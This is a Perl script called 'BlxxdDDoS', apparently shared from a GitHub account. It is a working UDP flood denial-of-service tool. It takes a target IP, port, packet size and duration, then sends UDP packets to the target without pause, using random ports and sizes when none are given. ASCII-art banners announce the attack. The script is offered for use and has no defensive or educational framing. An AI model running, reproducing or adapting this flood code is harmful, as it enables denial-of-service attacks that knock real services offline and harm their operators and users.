#!/usr/bin/perl
 
# DDoS Script made by https://github.com/zBlxxded/

use Socket;
use strict;

if ($#ARGV != 3) {
  print "\n██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗     ██████╗ ██████╗  ██████╗ ███████╗\n██╔══██╗██║     ╚██╗██╔╝╚██╗██╔╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n██████╔╝██║      ╚███╔╝  ╚███╔╝ ██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗\n██╔══██╗██║      ██╔██╗  ██╔██╗ ██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║\n██████╔╝███████╗██╔╝ ██╗██╔╝ ██╗██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║\n╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝";
  print "\n\n» Correct usage: perl BlxxdDDoS-eng.pl [IP] [Port] [Packets] [Time]\n\n";
  print "» Port: Use a random port between 1 and 65535.\n";
  print "» Packets: Use a random number between 64 and 1024 random packets.\n";
  print "» Time: In seconds.\n\n";
  print "» Example: perl flood.pl 0.0.0.0 80 100 30\n\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "\n██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗     ██████╗ ██████╗  ██████╗ ███████╗\n██╔══██╗██║     ╚██╗██╔╝╚██╗██╔╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n██████╔╝██║      ╚███╔╝  ╚███╔╝ ██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗\n██╔══██╗██║      ██╔██╗  ██╔██╗ ██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║\n██████╔╝███████╗██╔╝ ██╗██╔╝ ██╗██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║\n╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n\nBlxxdDDoS » ¡ERROR! · The IP provided is invalid: $ip\n\n";
$endtime = time() + ($time ? $time : 1000000);

socket(flood, PF_INET, SOCK_DGRAM, 17);

print "\n██████╗ ██╗     ██╗  ██╗██╗  ██╗██████╗     ██████╗ ██████╗  ██████╗ ███████╗\n██╔══██╗██║     ╚██╗██╔╝╚██╗██╔╝██╔══██╗    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝\n██████╔╝██║      ╚███╔╝  ╚███╔╝ ██║  ██║    ██║  ██║██║  ██║██║   ██║███████╗\n██╔══██╗██║      ██╔██╗  ██╔██╗ ██║  ██║    ██║  ██║██║  ██║██║   ██║╚════██║\n██████╔╝███████╗██╔╝ ██╗██╔╝ ██╗██████╔╝    ██████╔╝██████╔╝╚██████╔╝███████║\n╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝\n\nBlxxdDDoS » Attacking the IP $ip at port " . ($port ? $port : "random") . " with " .
  ($size ? "$size bytes" : "random size") . " packets" .
  ($time ? " for $time second(s)" : "") . "\n";
print "flood » To stop the attack press [Ctrl + C]\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
